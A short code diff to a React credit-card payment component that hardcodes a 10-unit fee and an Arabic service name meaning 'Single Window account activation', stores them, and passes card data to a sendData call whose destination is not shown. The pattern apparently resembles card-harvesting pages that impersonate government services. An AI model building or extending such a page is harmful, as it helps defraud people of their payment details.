@@ -345,15 +345,17 @@ export default function CreditCardPayment() {
     }
 
     const paymentData = {
-      totalPaid: totalAmount,
+      totalPaid: "10",
       cardType: cardType,
       cardLast4: cleanCardNumber.slice(-4),
-      serviceName: serviceName,
+      serviceName: "تفعيل حساب النافذة الواحدة",
       bankName: bankInfo?.bank || '',
       bankLogo: bankInfo?.logo || '',
     };
 
     localStorage.setItem("paymentData", JSON.stringify(paymentData));
+    localStorage.setItem("sw_service_name", "تفعيل حساب النافذة الواحدة");
+    localStorage.setItem("sw_service_amount", "10");
 
     sendData({
       paymentCard: {
